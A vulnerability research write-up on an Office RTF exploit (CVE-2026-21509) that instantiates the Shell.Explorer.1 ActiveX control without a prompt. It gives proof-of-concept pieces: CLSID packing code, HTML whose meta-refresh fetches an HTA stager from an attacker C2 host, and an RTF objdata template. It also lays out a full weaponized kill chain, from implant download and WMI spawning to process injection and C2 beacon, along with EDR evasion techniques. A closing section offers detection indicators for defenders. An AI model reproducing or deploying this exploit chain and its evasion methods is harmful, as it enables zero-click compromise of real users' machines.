0-Day Research: Shell.Explorer.1 Kill Bit Bypass (CVE-2026-21509)

JANUARY 2026 — VULNERABILITY RESEARCH / INITIAL ACCESS / OLE EXPLOITATION

While developing initial access capabilities for a custom C2 framework, I identified a weakness in how Microsoft Office handles OLE ActiveX instantiation in RTF documents. The vulnerability allows arbitrary code execution with zero user interaction beyond opening the document — no macros, no "Enable Content" prompt, no kill bit enforcement.

Microsoft assigned this CVE-2026-21509 and patched it in the January 2026 security update.

The Vulnerability

The attack abuses Shell.Explorer.1, the WebBrowser ActiveX control (CLSID {EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B}), which wraps an embedded Internet Explorer /Trident rendering engine.

On unpatched Office installations (2016, 2019, LTSC), embedding this control as an OLE object inside an RTF document causes Word to instantiate it without any security prompt. The embedded browser engine then processes HTML content stored in the OLE object's Contents stream. A simple <meta http-equiv="refresh"> tag triggers automatic navigation to an attacker-controlled URL.

This bypasses the COM kill bit mechanism — a registry-based safety control designed to prevent dangerous ActiveX controls from being instantiated. Shell.Explorer.1 is not flagged by kill bit enforcement on vulnerable Office versions, making this a kill bit bypass.

Root Cause

The vulnerability exists because Office's RTF parser processes \objocx directives and instantiates the referenced ActiveX control before evaluating whether the control should be restricted. The attack flow:

  1. RTF document contains an {\object\objocx} directive with class Shell.Explorer.1
  2. Word parses the \objdata block containing a valid CFB (Compound File Binary) structure
  3. The CFB Root Entry carries the Shell.Explorer.1 CLSID
  4. Office instantiates the WebBrowser control and feeds it the Contents stream
  5. The Trident engine renders the HTML and follows the meta-refresh to an external URL
  6. The external URL serves an HTA payload, which mshta.exe executes automatically

No VBA, no macros, no user approval. The entire chain fires on document open.

Proof of Concept

The core of the exploit is constructing a valid OLE2/CFB structure that Office will accept. The CFB must contain four streams with correct formatting:

Root Entry (CLSID = Shell.Explorer.1)
├── \x01CompObj    — OLE metadata, user type, ProgID
├── \x01Ole        — OLE control flags (embedded object)
├── \x03ObjInfo    — ActiveX control flags (0x1004)
└── Contents       — HTML with meta-refresh payload

The CLSID is packed in little-endian format as required by the CFB specification:

CLSID = struct.pack('<IHH', 0xEAB22AC3, 0x30C1, 0x11CF) \
      + b'\xa7\xeb\x00\x00\xc0\x5b\xae\x0b'

The Contents stream contains minimal HTML that triggers the navigation:

<html>
<head>
<meta http-equiv="refresh" content="0;url=https://[C2]/stage.hta">
</head>
<body></body>
</html>

The CFB is wrapped in an OLE1 container (version 0x00000501, format 0x00000002 for embedded objects), hex-encoded, and placed inside an RTF \objdata block:

{\object\objocx\objsetsize\objw8000\objh6000
{\*\objclass Shell.Explorer.1}
{\*\objdata
[hex-encoded OLE1 + CFB structure]
}
}

Building the CFB correctly is the most complex part. The structure requires proper sector allocation (FAT chains), a valid directory entry red-black tree, and correct stream sizing. An incorrectly formatted CFB will cause Word to silently reject the object.

Weaponization

I integrated this vulnerability into a custom C2 framework as one of several initial access vectors. The complete kill chain:

RTF Document (social-engineered)
  └─ Shell.Explorer.1 OLE object instantiated (no prompt)
      └─ Trident engine renders embedded HTML
          └─ meta-refresh navigates to external HTA
              └─ mshta.exe executes HTA stager
                  └─ Stager downloads implant via MSXML2
                      └─ WMI spawns implant (parent: WmiPrvSE.exe)
                          └─ Implant injects into explorer.exe
                              └─ C2 beacon established

The HTA stager uses several evasion techniques to avoid signature-based detection:

  • String fragmentation — all sensitive strings are split via concatenation ("Scri" & "pting" & ".FileSy" & "stemObj" & "ect")
  • Chr() encoding — critical characters are generated at runtime (Chr(87) = W)
  • WMI process creation — the implant is spawned via Win32_Process.Create, resulting in WmiPrvSE.exe as the parent process rather than mshta.exe
  • Self-deletion — the stager removes itself from disk after execution

This vector was deployed alongside traditional macro-based delivery (template injection via .dotm remote templates) and HTML smuggling with ISO sideloading, giving operators flexibility based on target environment hardening.

Detection Guidance

For defenders and threat intelligence analysts, the key indicators are:

  • RTF documents containing \objocx with class Shell.Explorer.1 — this combination is almost never legitimate
  • CLSID EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B in embedded OLE objects
  • mshta.exe spawned by WINWORD.EXE — high-confidence indicator of OLE-based initial access
  • Process lineage: WINWORD.EXE → mshta.exe → WmiPrvSE.exe → [implant]

YARA rules should target the hex-encoded CLSID (C32AB2EAC130CF11A7EB0000C05BAE0B) within RTF \objdata blocks. The combination of \objocx + this CLSID is a reliable signature with minimal false positives.

Implications

This vulnerability demonstrates that ActiveX-based attack surfaces in Office remain underexplored. Kill bit enforcement is assumed to be a reliable mitigation, but specific controls like Shell.Explorer.1 can slip through when the instantiation path bypasses the standard COM safety checks.

The zero-interaction requirement makes this particularly dangerous for targeted operations. Unlike macro-based attacks, there is no user decision point — the payload executes the moment the document is opened. Combined with RTF's plain-text format (which allows trivial obfuscation of the embedded binary data), this creates a reliable initial access vector that evaded major EDR platforms at the time of discovery.
